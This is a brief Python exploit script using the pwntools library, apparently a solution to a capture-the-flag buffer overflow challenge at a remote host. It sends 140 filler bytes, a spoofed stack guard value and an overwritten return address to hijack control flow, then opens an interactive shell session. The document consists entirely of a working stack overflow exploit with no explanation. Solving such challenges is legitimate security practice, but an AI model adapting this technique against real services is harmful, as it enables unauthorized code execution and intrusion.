from pwn import * 
io = remote("bof101.sstf.site",1337)

io.sendlineafter("What is your name?",b"A"*140 + p32(0xdeadbeef) + p64(0) + p64(0x4011f6))
io.interactive()
